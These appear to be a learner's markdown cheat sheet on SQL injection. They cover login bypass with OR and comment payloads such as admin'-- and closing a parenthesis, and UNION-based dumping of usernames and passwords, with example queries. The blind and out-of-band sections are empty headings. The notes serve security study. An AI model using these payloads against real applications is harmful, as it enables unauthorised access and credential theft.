# SQL Injection
### Summary
Injection occurs user-input is put into the SQL query string without properly sanitizing or filtering the input
## Common
## Authentication Bypass
For Auth bypass, the query always needs to return true
```sql
# Basic Admin Panel Query String
SELECT * FROM logins WHERE username = 'admin' AND password = 'p@ssw0rd';
# This statement returns True based on the "AND" Statement if both the username and password match the same entry in sql,
# and thus allows the login
```
### OR Injection ([Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass))
```sql
# Injected Code
admin' or '1'='1
# Final Query
SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password = 'something';

# Easy way to understand this, AND is evaluated first and will return false, assuming 'something' isn't the password
# When the OR is evaluated, 1=1 is always true, so that will return true, and because it's an "OR" statement, the
# whole statement will return true. 
# NOTE: This will only work with a valid username
```
```sql
# No known username (We need to have an overall true query)
SELECT * FROM logins WHERE username='notAdmin' OR '1'='1' AND password = 'something' OR '1'='1';

# The additional OR statement makes the password field evaluate as true, because 1=1 is always true.
```
### Using Comments
3 types of comments ```--```,```#``` and inline comments ```/**/```(Inline comments are not frequently used in injection)
```sql
# Example "-- "
SELECT username FROM logins; -- Selects usernames from the logins table

# NOTE: 2 dashes are not enough to start a comment. There has to be space at the end. The empty space cannot be passed in a
# URL. Use (+) to url encode an empty space
```
```sql
# Example "#"
SELECT username FROM logins; # Selects usernames from the logins table
# Note: # will not be passed in a URL. It has to be URL encoded as '%23'
```
```sql
# Using comment for auth bypass
# Injected Code "admin'-- " as the username
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
# Everything after the '-- ' is commented out, and as long as the username match's in SQL, the query will return true
```
### Paranthetical evaulations  
Evals in Parantheses are always evaluated first  
Let's take the following:
```sql
SELECT * FROM logins WHERE (username='admin' and id>1)AND password = 'hashed password';
```
The query above ensures that the users ID is always greater than 1.  
Logging in with 'Admin' and the correct password will still fail if the admin has an id = 1  
Logging in with user 'Tom' and toms correct password will result in a successful login  
Attempting to just comment out the rest of the query will result in a syntax error.  
```sql
SELECT * FROM logins WHERE (username='admin'-- ' and ID>1) AND password = 'hashed password';
# This results in a syntax error because you didn't close out the paranthesis
```
The solution is to adjust your syntax to close out the parenthesis  
Injected Code: admin')-- 
```sql
# Resulting query
SELECT * FROM logins WHERE (username='admin')-- ' AND id > 1) AND password = 'hashed password';
# As you can see, we properly closed the parenthesis, and commented out the rest of the query, thus returning true
```
## The Union Clause
### Summary
Union is used to combine results from multiple SELECT statements
Can SELECT and dump data from all across the DBMS, from multiple tables and db's

```sql
# Example single statements
SELECT * FROM ports;
SELECT * FROM ships;
# Each of these returns 1 entry from 1 table
```
```sql
# Exampe UNION combining the above
SELECT * FROM ports UNION SLECT * FROM ships;
# Combines the entries from the first 2 statements
```
### Even Columns
Assuming the products table only has 2 columns
```sql
SELECT * FROM products WHERE product_id = '1' UNION SELECT username, password from passwords-- ';
# This query will return username and password from the passwords table
```
### Uneven Columns
We can fill the extra columns with junk data to make even columns
When filling columns with junk, the data type must match the original column
For advanced injection, We can use 'NULL' as 'NULL' fits all data types

Assuming: The products table has 2 column, and we only want to retrieve username from the passwords table:
```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords;
#                                                                     ^ injected junk
# If the products table had more than 2 columns, like 3 or 4 columns, we would have to add more junk
SELECT * from products where product_id = '1' UNION SELECT username, 2, 3, 4 from passwords -- ';
#                                                                    ^  ^  ^ Injected junk
```
### Considerations
UNION statments can only operate on SELECT statements with an equal number of columns

## In-Band
### Summary
Output of both the intended and new query are output directly to the screen and can be directly read.
### Union Based
### Error Based
## Blind
### Summary
Output may not printed, so we'll have to use SQL logic to get the output character by character
### Boolean Based
### Time Based
## Out-of-band
### Summary
No direct access to the output, so we have to direct the output to a remote location, like a DNS record, and retrieve it from there.
